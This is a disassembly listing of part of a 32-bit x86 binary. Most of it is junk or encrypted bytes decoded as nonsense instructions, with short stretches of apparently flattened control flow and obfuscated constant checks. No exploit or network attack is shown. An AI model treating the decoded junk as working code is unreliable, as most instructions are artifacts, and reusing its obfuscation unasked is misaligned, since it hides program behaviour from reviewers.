  4018d0:	cmp    DWORD PTR [esi+0x29],eax
  4018d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018d4:	aam    0xa
  4018d6:	xchg   edi,eax
  4018d7:	mul    BYTE PTR [edi]
  4018d9:	aaa    
  4018da:	and    al,0xce
  4018dc:	loopne 0x4018f0
  4018de:	add    BYTE PTR [ebx],ch
  4018e0:	mov    ebp,0xf55af884
  4018e5:	pop    eax
  4018e6:	adc    dl,BYTE PTR [edx]
  4018e8:	ins    BYTE PTR es:[edi],dx
  4018e9:	stos   DWORD PTR es:[edi],eax
  4018ea:	(bad)  
  4018eb:	xchg   ebx,eax
  4018ec:	aas    
  4018ed:	pushf  
  4018ee:	rcr    BYTE PTR [esi],1
  4018f0:	fcom   QWORD PTR [edx+0x50c48fb3]
  4018f6:	pop    edi
  4018f7:	sti    
  4018f8:	add    dh,bh
  4018fa:	sbb    al,0xa
  4018fc:	pop    es
  4018fd:	lock sub dl,BYTE PTR [esi]
  401900:	std    
  401901:	fdiv   st(2),st
  401903:	push   edx
  401904:	imul   ecx,DWORD PTR [edx],0x6a
  401907:	pop    ebp
  401908:	inc    edi
  401909:	neg    BYTE PTR [esi-0x54359646]
  40190f:	scas   eax,DWORD PTR es:[edi]
  401910:	adc    DWORD PTR [edx+0x1f],esp
  401913:	pop    edx
  401914:	xlat   BYTE PTR fs:[ebx]
  401916:	out    0x2,al
  401918:	jg     0x401903
  40191a:	in     eax,dx
  40191b:	imul   ebp,DWORD PTR [bx+di+0x52],0x78
  401920:	pop    ebp
  401921:	cwde   
  401922:	aas    
  401923:	adc    esp,DWORD PTR [esi-0x15fbfea3]
  401929:	sahf   
  40192a:	ss leave 
  40192c:	push   edx
  40192d:	mov    edi,0xac73718
  401932:	add    edx,DWORD PTR [ebx+edx*1-0x450ff7e7]
  401939:	ret    0xebd7
  40193c:	adc    eax,DWORD PTR [edi]
  40193e:	ret    0x3981
  401941:	jo     0x40190b
  401943:	xchg   edi,eax
  401944:	mov    bl,0x63
  401946:	push   eax
  401947:	leave  
  401948:	in     al,0xf7
  40194a:	ins    BYTE PTR es:[edi],dx
  40194b:	mov    ecx,DWORD PTR [ecx+0x458be445]
  401951:	in     al,0xc7
  401953:	add    BYTE PTR [ecx-0x740760d3],ch
  401959:	inc    ebp
  40195a:	in     al,dx
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0xd17bf628
  401994:	jecxz  0x40199c
  401996:	push   eax
  401997:	jo     0x401a13
  401999:	jo     0x401a0b
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	sti    
  4019a0:	cmp    ebp,DWORD PTR [ecx-0x56]
  4019a3:	xchg   BYTE PTR ds:0xb591577,ah
  4019a9:	outs   dx,BYTE PTR ds:[esi]
  4019aa:	retf   0x71da
  4019ad:	xchg   edx,eax
  4019ae:	test   BYTE PTR [edi],dh
  4019b0:	sbb    eax,DWORD PTR [ebx+esi*2+0x47]
  4019b4:	or     edx,esp
  4019b6:	and    al,BYTE PTR ds:0x429948fe
  4019bc:	sbb    DWORD PTR [ebp+0x28],ebx
  4019bf:	pop    eax
  4019c0:	adc    DWORD PTR [edx+0x73a69a3b],esi
  4019c6:	mov    esi,0x35ed15cb
  4019cb:	dec    esp
  4019cc:	or     ah,BYTE PTR [ecx*1-0x1d1ce32c]
  4019d3:	push   ebx
  4019d4:	dec    ebx
  4019d6:	mov    dl,0x6
  4019d8:	push   ebx
  4019d9:	loopne 0x4019f7
  4019db:	jo     0x401996
  4019dd:	or     DWORD PTR [eax-0x5d],edx
  4019e0:	hlt    
  4019e1:	int3   
  4019e2:	xchg   ebp,eax
  4019e3:	in     eax,0xed
  4019e5:	push   eax
  4019e6:	mov    cl,0x31
  4019e8:	repnz ins DWORD PTR es:[edi],dx
  4019ea:	int3   
  4019eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019ec:	push   ebp
  4019ed:	les    esi,FWORD PTR [eax]
  4019ef:	fistp  DWORD PTR [ecx+0x22]
  4019f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019f3:	and    al,0xa4
  4019f5:	dec    ebx
  4019f6:	cmp    BYTE PTR ds:[esi+0x79],bl
  4019fa:	mov    edi,0x617069aa
  4019ff:	mov    edi,0x95c503f3
  401a04:	cmc    
  401a05:	sti    
  401a06:	sbb    BYTE PTR ds:0xc48307fe,dh
  401a0c:	jmp    0x3405:0x25be92d6
  401a13:	push   esp
  401a14:	add    BYTE PTR [edx+0x26],0x53
  401a18:	dec    ebp
  401a19:	lods   eax,DWORD PTR ds:[esi]
  401a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a1b:	push   0xce0dd2c8
  401a20:	and    DWORD PTR [edx+edi*4+0x7f],esi
  401a24:	jl     0x401a36
  401a26:	mov    al,0x67
  401a28:	add    eax,0x1efd9348
  401a2d:	dec    ebp
  401a2e:	movntps XMMWORD PTR [ebx+0x7d],xmm5
  401a32:	push   ebp
  401a33:	xchg   esp,eax
  401a34:	mov    bh,0xe1
  401a36:	scas   eax,DWORD PTR es:[edi]
  401a37:	push   ds
  401a38:	fcmovbe st,st(1)
  401a3a:	inc    eax
  401a3b:	enter  0xab22,0xb3
  401a3f:	lods   eax,DWORD PTR ds:[esi]
  401a40:	sbb    BYTE PTR [eax-0x7c955fe0],dl
  401a46:	jecxz  0x4019dc
  401a48:	xchg   esi,eax
  401a49:	fwait
  401a4a:	add    bl,bh
  401a4c:	or     eax,0x458b42c7
  401a51:	xor    al,0x70
  401a53:	pop    ss
  401a54:	pop    ecx
  401a55:	jmp    0x604e6851
  401a5a:	sbb    edx,DWORD PTR [edi+0xd]
  401a5d:	mov    es,ebx
  401a5f:	loop   0x401a54
  401a61:	dec    ecx
  401a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a63:	xor    BYTE PTR [edx+ebp*2-0x407e4064],bh
  401a6a:	pop    esi
  401a6b:	push   edi
  401a6d:	outs   dx,BYTE PTR ds:[esi]
  401a6e:	ins    DWORD PTR es:[edi],dx
  401a6f:	popa   
  401a70:	mov    al,0xb7
  401a72:	mov    esi,0x2d0d47b8
  401a77:	ja     0x401a91
  401a79:	mov    BYTE PTR [eax+0x7363ceb5],al
  401a7f:	inc    ebx
  401a80:	call   0x57a0:0xf0636121
  401a87:	shl    al,1
  401a89:	sub    ecx,ebp
  401a8b:	call   0x49c79f81
  401a90:	ja     0x401aaf
  401a92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a93:	call   0x59769bf1
  401a98:	xor    eax,0x4603987
  401a9d:	push   ss
  401a9e:	outs   dx,DWORD PTR ds:[esi]
  401a9f:	adc    DWORD PTR [edx+ecx*8],0xffffffb4
  401aa3:	fstp   DWORD PTR [ebx-0x1d9e5815]
  401aa9:	jmp    0x7bc1:0xfc7cef4
  401ab0:	leave  
  401ab1:	sub    dh,BYTE PTR [edx]
  401ab3:	fiadd  DWORD PTR [edx+edi*2]
  401ab6:	xchg   DWORD PTR [edi+ebx*1+0x438154b],esi
  401abd:	pop    eax
  401abe:	and    ah,cl
  401ac0:	mov    al,ds:0x49fa824a
  401ac5:	icebp  
  401ac6:	ss out 0x8,al
  401ac9:	shl    DWORD PTR [ebx-0xd],0xf3
  401acd:	xchg   ecx,eax
  401ace:	shl    BYTE PTR [ebx],0xdd
  401ad1:	fimul  DWORD PTR [edi+0x45]
  401ad4:	stos   BYTE PTR es:[edi],al
  401ad5:	mov    edx,0xfc16acc5
  401ada:	clc    
  401adb:	or     al,0xb4
  401add:	jp     0x401af5
  401adf:	sbb    ebx,DWORD PTR [ebx-0x4d2da846]
  401ae5:	shl    DWORD PTR [ebx],cl
  401ae7:	xor    ebp,DWORD PTR [esi+0x57f31c82]
  401aed:	mov    esi,0x100caa64
  401af2:	adc    esi,eax
  401af4:	sub    cl,cl
  401af6:	mov    cl,0xf8
  401af8:	std    
  401af9:	in     al,0xd2
  401afb:	loope  0x401b6d
  401afd:	inc    ecx
  401afe:	(bad)  
  401aff:	mov    bl,0x42
  401b01:	test   dl,cl
  401b03:	mov    ch,0x2b
  401b05:	jb     0x401b62
  401b07:	outs   dx,DWORD PTR ds:[esi]
  401b08:	cmp    edi,DWORD PTR [edi]
  401b0a:	into   
  401b0b:	fisub  WORD PTR [ebx-0x71]
  401b0e:	mov    edx,0xfd5e018e
  401b13:	ror    DWORD PTR [eax-0x1c4f15cd],1
  401b19:	jne    0x401b1d
  401b1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b1c:	retf   
  401b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b1e:	bound  ecx,QWORD PTR [ecx+0x19783f9e]
  401b24:	add    BYTE PTR [esp+ecx*1+0x2f3d94f],ah
  401b2b:	dec    esp
  401b2c:	dec    edx
  401b2d:	jmp    edx
  401b2f:	xchg   ebp,eax
  401b30:	sbb    BYTE PTR [ecx-0x69],cl
  401b33:	sub    ch,BYTE PTR [ecx]
  401b35:	call   0x8f6a8494
  401b3a:	mul    dl
  401b3c:	push   edi
  401b3d:	sub    eax,0xd44f906b
  401b42:	push   es
  401b43:	xlat   BYTE PTR ds:[ebx]
  401b44:	pop    edi
  401b45:	into   
  401b46:	call   0xb055:0x119a22fd
  401b4d:	sti    
  401b4e:	mov    ecx,0xa97422cc
  401b53:	inc    ebp
  401b54:	push   esi
  401b55:	inc    edi
  401b56:	jmp    0x401b05
  401b58:	jecxz  0x401ada
  401b5a:	(bad)  
  401b5c:	mov    edi,0xa2a2b603
  401b61:	pop    ecx
  401b62:	stos   DWORD PTR es:[edi],eax
  401b63:	dec    esi
  401b64:	sar    BYTE PTR [ebx],0xf8
  401b67:	fidivr WORD PTR [eax-0x263564e6]
  401b6d:	lahf   
  401b6e:	out    dx,eax
  401b6f:	outs   dx,BYTE PTR ds:[esi]
  401b70:	mov    dh,0xc4
  401b72:	mov    ecx,0x94b2303d
  401b77:	xor    eax,0x5eca1c01
  401b7c:	arpl   WORD PTR [edi],bx
  401b7e:	fdivr  QWORD PTR [ecx-0x1b]
  401b81:	push   0x53d3ee08
  401b86:	aaa    
  401b87:	mov    cs,edx
  401b89:	mov    ds:0x38c19cc2,al
  401b8e:	(bad)  [edi+ecx*8-0x71]
  401b92:	test   BYTE PTR [edx-0x3a],ch
  401b95:	jmp    0x776:0x63e82c2a
  401b9c:	adc    al,0x3b
  401b9e:	push   eax
  401b9f:	mov    eax,DWORD PTR [ebp-0x10]
  401ba2:	mov    edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    dh,BYTE PTR [edx+0x41]
  401bde:	pop    esp
  401bdf:	mov    ah,0x70
  401be1:	js     0x401c53
  401be3:	jo     0x401c55
  401be5:	jle    0x401c57
  401be7:	jo     0x401bf5
  401be9:	push   cs
  401bea:	scas   eax,DWORD PTR es:[edi]
  401beb:	or     BYTE PTR [esi-0x7b],bl
  401bee:	stos   DWORD PTR es:[edi],eax
  401bef:	pop    ebx
  401bf0:	ficom  DWORD PTR [esi]
  401bf2:	push   edx
  401bf3:	jmp    0x76cc:0x2abd03bb
  401bfa:	jl     0x401c18
  401bfc:	or     DWORD PTR [ebx],eax
  401bfe:	cmp    bh,dh
  401c00:	test   eax,0xcd3d2a27
  401c05:	mov    edi,0x9e0be5b2
  401c0a:	mov    ebp,0x31f100eb
  401c0f:	sahf   
  401c10:	xor    BYTE PTR [esi+0x3f],dl
  401c13:	push   ds
  401c14:	jecxz  0x401c69
  401c16:	lods   eax,DWORD PTR ds:[esi]
  401c17:	fcomp  DWORD PTR [edx]
  401c19:	ret    0x2b7c
  401c1c:	sbb    ch,BYTE PTR [eax+ebp*2]
  401c1f:	test   BYTE PTR [ebx+0x5d32f146],cl
  401c25:	hlt    
  401c26:	jo     0x401c2e
  401c28:	push   eax
  401c29:	cmp    eax,0x8f2ed90e
  401c2e:	jae    0x401c1b
  401c30:	lock pop ss
  401c32:	mov    ecx,?
  401c34:	push   0xffffffd7
  401c36:	push   ecx
  401c37:	sbb    eax,0xa75d9f58
  401c3c:	loopne 0x401c7f
  401c3e:	push   ebx
  401c3f:	and    eax,edi
  401c41:	js     0x401c46
  401c43:	xchg   edi,eax
  401c44:	ret    
  401c45:	cmp    al,0xae
  401c47:	inc    edi
  401c48:	aam    0x1b
  401c4a:	push   eax
  401c4b:	adc    BYTE PTR [ecx],bl
  401c4d:	sub    edi,DWORD PTR [edx]
  401c4f:	arpl   WORD PTR [ebx],si
  401c51:	mov    ds:0xc413f843,al
  401c56:	ror    al,1
  401c58:	xchg   ebx,eax
  401c59:	test   eax,0xce42849c
  401c5e:	add    esi,DWORD PTR [ebp-0x72]
  401c61:	nop
  401c62:	aas    
  401c63:	sbb    eax,0x34229511
  401c68:	test   BYTE PTR [ecx-0xc],dh
  401c6b:	push   ds
  401c6c:	aaa    
  401c6d:	fwait
  401c6e:	xor    al,0x63
  401c70:	pop    edi
  401c71:	icebp  
  401c72:	loop   0x401c66
  401c74:	imul   esi,DWORD PTR [ecx-0x43],0xffffff88
  401c78:	ja     0x401c8b
  401c7a:	and    bl,BYTE PTR [esi]
  401c7c:	call   0x1743:0x66017c7a
  401c83:	mov    edi,0xf6dd6696
  401c88:	loop   0x401ca2
  401c8a:	push   edx
  401c8b:	leave  
  401c8c:	retf   0x32bc
  401c8f:	xchg   edi,eax
  401c90:	pushf  
  401c91:	fdiv   st,st(4)
  401c93:	call   0xc159:0x74f5e1be
  401c9a:	lahf   
  401c9b:	sub    eax,0x6a9991a2
  401ca0:	sub    edx,DWORD PTR [ebx]
  401ca2:	lea    esp,[ebx+ebx*1-0xb]
  401ca6:	lods   al,BYTE PTR ds:[esi]
  401ca7:	into   
  401ca8:	fs inc ecx
  401caa:	mov    ds:0x6d023f5e,al
  401caf:	jg     0x401cfe
  401cb1:	lods   al,BYTE PTR ds:[esi]
  401cb2:	push   ebp
  401cb3:	retf   
  401cb4:	shr    BYTE PTR [edi],cl
  401cb6:	dec    esi
  401cb7:	push   edx
  401cb8:	js     0x401d0c
  401cba:	cmp    BYTE PTR [edi],cl
  401cbc:	pop    ss
  401cbd:	lds    ebx,FWORD PTR [esi]
  401cbf:	push   esi
  401cc0:	or     DWORD PTR [ebx+0x5be6d063],esp
  401cc6:	ja     0x401ca4
  401cc8:	test   bl,ah
  401cca:	fisttp QWORD PTR [esi]
  401ccc:	cmp    eax,0xa9a98cdf
  401cd1:	repz sub cl,dl
  401cd4:	mov    dh,0x62
  401cd6:	jmp    0x401c92
  401cd8:	pop    ebx
  401cd9:	mov    al,ds:0x3f8c054e
  401cde:	pop    ecx
  401cdf:	add    al,0x8a
  401ce1:	sub    BYTE PTR [ebp+0x7bb58709],bl
  401ce7:	fstp   QWORD PTR [esi-0x7080a8c0]
  401ced:	sub    eax,0xab8afbb8
  401cf2:	loope  0x401cef
  401cf4:	es jmp 0x5559:0x7dfd63da
  401cfc:	cli    
  401cfd:	fisttp QWORD PTR [esi]
  401cff:	sti    
  401d00:	fmulp  st(5),st
  401d02:	dec    edi
  401d03:	inc    ebx
  401d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d05:	mov    eax,ds:0x1470c4c2
  401d0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d0b:	and    eax,DWORD PTR [ebp+0x83f5932]
  401d11:	or     DWORD PTR [ebp+0x22e0a0a6],0x37c653de
  401d1b:	adc    al,0x3f
  401d1d:	xor    di,si
  401d20:	inc    eax
  401d21:	jne    0x401ca3
  401d23:	or     esi,DWORD PTR [edx+0x24]
  401d26:	fs push esp
  401d28:	sub    DWORD PTR [esi],0xffffffeb
  401d2b:	lock popa 
  401d2d:	ds popf 
  401d2f:	out    0x80,al
  401d31:	xchg   ebp,eax
  401d32:	push   0x943f5b76
  401d37:	ins    BYTE PTR es:[edi],dx
  401d38:	adc    eax,0xf09eb1b0
  401d3d:	sbb    edi,esi
  401d3f:	lock and DWORD PTR [ecx-0x40eea198],edx
  401d46:	aas    
  401d47:	jle    0x401db0
  401d49:	shl    DWORD PTR [esi],1
  401d4b:	add    eax,0x85230d5
  401d50:	mul    BYTE PTR [eax-0xf]
  401d53:	dec    edi
  401d54:	int3   
  401d55:	ror    DWORD PTR [eax],1
  401d57:	push   ecx
  401d58:	inc    esi
  401d59:	xchg   edi,eax
  401d5a:	out    0xa,al
  401d5c:	dec    ecx
  401d5d:	out    dx,eax
  401d5e:	test   DWORD PTR [esi+0x68],eax
  401d61:	das    
  401d62:	fsub   QWORD PTR [ecx]
  401d64:	ficomp DWORD PTR [ebx+0x4927bf69]
  401d6a:	mov    cl,0x23
  401d6c:	sbb    al,0xf0
  401d6e:	rcr    BYTE PTR [ebp+0x70900a69],1
  401d74:	pop    esi
  401d75:	xor    cl,bh
  401d77:	jmp    0x401deb
  401d79:	inc    esi
  401d7a:	gs popa 
  401d7c:	rcr    BYTE PTR [esp+eiz*4+0x7a4525f7],1
  401d83:	mov    DWORD PTR [edi+0x19d385bf],esp
  401d89:	pop    ecx
  401d8a:	sbb    BYTE PTR [ebx-0x15],ah
  401d8d:	jnp    0x401db3
  401d8f:	sar    BYTE PTR [edi-0xe],0x1f
  401d93:	push   0x3c149477
  401d98:	retf   0xe745
  401d9b:	cs push esp
  401d9d:	(bad)  
  401d9e:	retf   0xe3a6
  401da1:	jp     0x401d9a
  401da3:	jb     0x401d95
  401da5:	cwde   
  401da6:	sbb    BYTE PTR [esi],ah
  401da8:	push   ecx
  401da9:	mov    ebp,0xfa0f636
  401dae:	dec    esi
  401daf:	sub    BYTE PTR [esi-0x307653ff],cl
  401db5:	or     DWORD PTR [edi-0x70],ebx
  401db8:	dec    esi
  401db9:	inc    ecx
  401dba:	mov    WORD PTR gs:[ecx],ss
  401dbd:	or     al,0x1a
  401dbf:	jns    0x401e07
  401dc1:	push   ebp
  401dc2:	int    0xdf
  401dc4:	arpl   WORD PTR [esi-0x717c1436],bx
  401dca:	sar    DWORD PTR [edx-0x9],1
  401dcd:	adc    ah,BYTE PTR [esi-0x69f2a822]
  401dd3:	neg    BYTE PTR [esi+0x7]
  401dd6:	inc    eax
  401dd7:	fidivr DWORD PTR [edx+0x636cf04f]
  401ddd:	jmp    0xccbc:0x62194dcb
  401de4:	adc    ecx,DWORD PTR [ecx+0x33]
  401de7:	ret    0x4503
  401dea:	call   0xca949b2c
  401def:	ins    BYTE PTR es:[edi],dx
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [eax+edi*1+0x27],dl
  401e44:	xchg   BYTE PTR [edx+0x70700670],bl
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	outs   dx,DWORD PTR ds:[esi]
  401e4f:	push   esi
  401e50:	mov    bh,0x58
  401e52:	out    dx,al
  401e53:	cmp    al,ah
  401e55:	dec    ebx
  401e56:	rol    BYTE PTR [edx+0x7b947d61],1
  401e5c:	xchg   edi,eax
  401e5d:	xlat   BYTE PTR ds:[ebx]
  401e5e:	push   ecx
  401e5f:	lods   eax,DWORD PTR ds:[esi]
  401e60:	in     al,dx
  401e61:	xor    DWORD PTR [ecx+0x7a],ebp
  401e64:	lea    esi,[ebx-0x1da230c8]
  401e6a:	cmp    DWORD PTR [esi+0x1184392f],ecx
  401e70:	pop    es
  401e71:	mov    cl,0x7e
  401e73:	sbb    al,0x49
  401e75:	or     al,0x2f
  401e77:	out    0x0,eax
  401e79:	adc    al,0xce
  401e7b:	push   cs
  401e7c:	sahf   
  401e7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e7e:	ror    DWORD PTR [edx+0x2c],cl
  401e81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e82:	mov    ebp,es
  401e84:	push   es
  401e85:	and    edx,DWORD PTR [edi+0x74]
  401e88:	pop    ebp
  401e89:	test   DWORD PTR [ecx+esi*2],esi
  401e8c:	xor    BYTE PTR [edx+edx*1],dl
  401e8f:	cmp    DWORD PTR [eax],eax
  401e91:	enter  0x5f8,0x80
  401e95:	or     edx,DWORD PTR [ecx]
  401e97:	cwde   
  401e98:	mov    ebp,0x11c0dc40
  401e9d:	or     ch,bh
  401e9f:	inc    ebp
  401ea0:	add    eax,esi
  401ea2:	or     eax,0x82281f23
  401ea7:	jl     0x401e2f
  401ea9:	adc    al,0xf5
  401eab:	imul   esp,DWORD PTR [esi+0x30],0x23
  401eaf:	pop    eax
  401eb0:	cmp    eax,0x6151d9b3
  401eb5:	and    cl,0x6b
  401eb8:	sti    
  401eb9:	retf   
  401eba:	adc    bl,BYTE PTR [ecx]
  401ebc:	test   eax,0x4e4dfd94
  401ec1:	xchg   DWORD PTR [esi+ebx*1+0x3b82cc],ecx
  401ec8:	push   ds
  401ec9:	mov    al,ds:0x9a0d9bfd
  401ece:	cmp    bl,BYTE PTR [esi]
  401ed0:	mov    fs,WORD PTR [eax-0x4b3f1b27]
  401ed6:	pop    eax
  401ed7:	add    esp,DWORD PTR [ecx+eiz*4]
  401eda:	push   0xa
  401edc:	cwde   
  401edd:	sbb    BYTE PTR [eax+edi*8-0x24],0x1e
  401ee2:	stos   BYTE PTR es:[edi],al
  401ee3:	jg     0x401e9b
  401ee5:	jo     0x401f0c
  401ee7:	enter  0x1d39,0xa6
  401eeb:	cmp    dh,dl
  401eed:	add    DWORD PTR [edi+eax*2],edx
  401ef0:	fstp   QWORD PTR [ebx-0x1f8a9231]
  401ef6:	xor    al,0xc9
  401ef8:	jg     0x401eef
  401efa:	(bad)  
  401efb:	lods   eax,DWORD PTR ds:[esi]
  401efc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401efd:	mov    cl,0x46
  401eff:	ficomp WORD PTR ds:0xfa74a4c
  401f05:	fldcw  WORD PTR [edx-0x60d748a]
  401f0b:	sbb    edx,DWORD PTR [ecx+edi*8+0x62714ae6]
  401f12:	shl    DWORD PTR [ebx+0x73],1
  401f15:	fist   DWORD PTR [ebp-0x7a99de4b]
  401f1b:	cmp    ch,bh
  401f1d:	imul   esp,ebp,0xffffffbd
  401f20:	popf   
  401f21:	lock cmp al,0xad
  401f24:	dec    eax
  401f25:	push   0xf1b0262d
  401f2a:	ret    0x979a
  401f2d:	fs inc edx
  401f2f:	(bad)  [esi+0x1a759ee4]
  401f35:	dec    esi
  401f36:	(bad)  
  401f37:	jae    0x401f5f
  401f39:	sbb    bh,al
  401f3b:	rcl    DWORD PTR [edi+0x6b],0xa7
  401f3f:	cmp    eax,0x8fa008bc
  401f44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f45:	idiv   ebx
  401f47:	loopne 0x401f7c
  401f49:	add    BYTE PTR [ebx+edi*8-0x5b],ch
  401f4d:	sahf   
  401f4e:	xchg   DWORD PTR [ebp+0x4c],edi
  401f51:	mov    es:0x409aa43c,eax
  401f57:	sahf   
  401f58:	das    
  401f59:	mov    ch,0xdb
  401f5b:	or     esi,ebx
  401f5d:	mov    ah,BYTE PTR [ebp+0x2a]
  401f60:	xchg   esi,eax
  401f61:	and    BYTE PTR [edi],al
  401f63:	mov    bh,0x2
  401f65:	data16 jb 0x401f9a
  401f68:	pop    edi
  401f69:	enter  0xabbc,0x45
  401f6d:	inc    esp
  401f6e:	xlat   BYTE PTR ds:[ebx]
  401f6f:	pop    edi
  401f70:	stos   BYTE PTR es:[edi],al
  401f71:	out    0x54,al
  401f73:	(bad)  
  401f75:	and    al,cl
  401f77:	inc    ecx
  401f78:	out    dx,al
  401f79:	add    ebp,ebx
  401f7b:	enter  0xebd0,0x17
  401f7f:	test   eax,0xd559664a
  401f84:	cwde   
  401f85:	push   eax
  401f86:	jo     0x401f33
  401f88:	sub    eax,0x9ef6c7b0
  401f8d:	pop    esp
  401f8e:	mov    esp,0x7bc78ba6
  401f93:	jae    0x401fe9
  401f95:	or     al,0xf2
  401f97:	inc    ebx
  401f98:	and    esp,DWORD PTR [ebx-0x55b33c07]
  401f9e:	in     al,0xb5
  401fa0:	push   es
  401fa1:	adc    eax,0x21e061a0
  401fa6:	jmp    0xd51aa1f4
  401fab:	aam    0x38
  401fad:	jne    0x401f81
  401faf:	addr16 mov eax,0x828e430
  401fb5:	call   0xc383:0x32ac91c0
  401fbc:	es imul ebx,DWORD PTR gs:[ecx],0x4696b64f
  401fc4:	mov    esi,0x7d63855e
  401fc9:	jg     0x401fc2
  401fcb:	inc    esp
  401fcc:	push   edx
  401fcd:	aaa    
  401fce:	aad    0xb5
  401fd0:	popf   
  401fd1:	fsubrp st(0),st
  401fd3:	pop    esi
  401fd4:	jno    0x401fd0
  401fd6:	fmul   DWORD PTR [eax]
  401fd8:	xor    edi,ecx
  401fda:	cwde   
  401fdb:	pop    esi
  401fdc:	call   0x6f410a97
  401fe1:	push   eax
  401fe2:	jns    0x40201e
  401fe4:	adc    DWORD PTR [esi],ebp
  401fe6:	xor    BYTE PTR [eax-0x146df2ac],al
  401fec:	or     esp,ebx
  401fee:	push   ss
  401fef:	push   edx
  401ff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ff1:	mov    eax,0xa103599d
  401ff6:	cwde   
  401ff7:	adc    DWORD PTR [ebx+0x5240f5eb],eax
  401ffd:	or     eax,0xd93699f6
  402002:	icebp  
  402003:	imul   eax,DWORD PTR [esi+0x45],0x2
  402007:	loope  0x402041
  402009:	adc    DWORD PTR [edi+0x5781514b],ebp
  40200f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402010:	das    
  402011:	scas   al,BYTE PTR es:[edi]
  402012:	push   cs
  402013:	not    ebp
  402015:	rol    BYTE PTR [ebp-0x1f],1
  402018:	mov    BYTE PTR [eax+0xb81816a],0x1f
  40201f:	and    DWORD PTR [edi-0x12],ecx
  402022:	jo     0x40201f
  402024:	sbb    al,0xb4
  402026:	jb     0x401ff1
  402028:	ret    
  402029:	adc    ch,BYTE PTR [esi+0x5734fbf8]
  40202f:	jbe    0x40205c
  402031:	jmp    edi
  402033:	out    0x8e,eax
  402035:	push   0x88803fd5
  40203a:	imul   edi,DWORD PTR [ecx-0x7c],0x82bf6ed4
  402041:	sub    BYTE PTR [eax],dh
  402043:	or     al,0xa1
  402045:	push   ebx
  402046:	sbb    dh,BYTE PTR [edi-0x6e844c7]
  40204c:	loope  0x40200b
  40204e:	mov    edx,DWORD PTR [ebp-0x28]
  402051:	mov    edx,DWORD PTR [edx]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	cmp    BYTE PTR [eax+esi*4+0x470c9a7],0x70
  402071:	jo     0x4020e3
  402073:	jle    0x4020e5
  402075:	jo     0x40200e
  402077:	mov    dl,0x4b
  402079:	sbb    DWORD PTR [eax-0x5506fee6],esi
  40207f:	(bad)  [eax+0x1]
  402082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402083:	inc    ebp
  402084:	sub    edx,edi
  402086:	pop    es
  402087:	jp     0x402066
  402089:	xchg   ebx,eax
  40208a:	pop    ds
  40208b:	ss mov bh,0xb2
  40208e:	enter  0x204d,0x5b
  402092:	popa   
  402093:	test   ebp,edx
  402095:	mov    eax,ds:0x5e68b101
  40209a:	pop    es
  40209b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40209c:	jbe    0x40202d
  40209e:	mov    ch,0x5d
  4020a0:	nop
  4020a1:	daa    
